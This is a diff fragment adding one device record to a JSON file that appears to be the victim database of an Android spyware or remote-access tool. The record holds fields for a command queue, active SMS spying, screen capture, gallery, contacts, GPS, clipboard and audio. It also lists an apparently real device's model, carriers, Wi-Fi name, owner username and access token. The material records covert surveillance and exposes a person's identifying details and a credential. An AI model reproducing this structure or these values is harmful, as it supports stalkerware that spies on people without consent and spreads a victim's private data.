@@ -17512,5 +17512,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "aimlock_701254a4",
+    "deviceName": "HP-HAAN-0478",
+    "ownerUsername": "yogzz1",
+    "token": "278511d6bb8c16439f926f0aec82dcfc",
+    "lastSeen": 1777005918570,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-24T04:45:18.570Z",
+    "deviceInfo": {
+      "model": "OPPO CPH2127",
+      "androidVersion": "Android 12",
+      "battery": 77,
+      "network": "WiFi: Arka & Riski",
+      "sim1": "TELKOMSEL",
+      "sim2": "TELKOMSEL"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
